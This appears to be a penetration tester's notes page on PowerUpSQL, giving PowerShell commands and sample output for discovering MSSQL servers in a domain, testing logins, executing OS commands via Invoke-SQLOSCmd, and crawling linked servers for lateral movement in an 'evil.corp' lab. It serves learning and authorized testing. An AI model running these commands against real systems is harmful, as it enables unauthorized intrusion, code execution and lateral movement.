# PowerUpSQL

## [[Vulnerable Machines]]
## Discovery
- `Get-SQLInstanceDomain`
  Searching for SPNs that begin with `MSSQL*`
- `Get-SQLInstanceBroadcast` 
- `Get-SQLInstanceScanUDP`
- [[BloodHound#Database Server]]

```ps
Get-SQLInstanceDomain

ComputerName     : srv1.edu.evil.corp
Instance         : srv1.edu.evil.corp,1433
DomainAccountSid : 150000[ ...snip... ]172110400
DomainAccount    : svc_mssql
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/srv1.edu.evil.corp:1433
LastLogon        : 5/14/2022 2:24 PM
Description      :
```

## Auto information gathering
```ps
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

## Test Login
```ps
Get-SQLConnectionTest -Instance "srv1.edu.evil.corp,1433" | fl

ComputerName : srv1.edu.evil.corp
Instance     : srv1.edu.evil.corp,1433
Status       : Accessible
```

## Gather information
```ps
Get-SQLServerInfo -Instance "srv1.edu.evil.corp,1433"

ComputerName           : srv1.edu.evil.corp
Instance               : SRV1
DomainName             : EDU
ServiceProcessID       : 3960
ServiceName            : MSSQLSERVER
ServiceAccount         : EDU\svc_mssql
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 13.0.5026.0
SQLServerMajorVersion  : 2019
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : SP2
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2016 Datacenter
OsVersionNumber        : SQL
Currentlogin           : EDU\john
IsSysadmin             : Yes
ActiveSessions         : 1
```

## SQL Query
```ps
Get-SQLQuery -Instance "srv1.edu.evil.corp,1433" -Query "select @@servername"

Column1
-------
SRV1
```

## [[SQL Command Execution]]
### Command Execution
```ps
Invoke-SQLOSCmd -Instance "srv1.edu.evil.corp,1433" -Command "whoami" -RawResults

edu\svc_mssql
```

## [[SQL Lateral Movement]]
### Crawl SQL Server Link
Manually querying databases to find links can be cumbersome and time-consuming, so you can also use `Get-SQLServerLinkCrawl` to automatically crawl all available links.
```ps
Get-SQLServerLinkCrawl -Instance "srv1.edu.evil.corp,1433"

Version     : SQL Server 2016 
Instance    : SRV1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV1}
User        : EDU\john
Links       : {SQL-1.EVIL.CORP}

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV1, SQL-1.EVIL.CORP}
User        : sa
Links       : {SQL01.evil.external}

Version     : SQL Server 2019 
Instance    : SQL01\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SRV1, SQL-1.EVIL.CORP, SQL01.evil.external}
User        : sa
Links       :
```

```meta
requirements: 
results: 
opsec: 
oss: #win
source: https://github.com/NetSPI/PowerUpSQL
description: SQL Exploitation Tools
```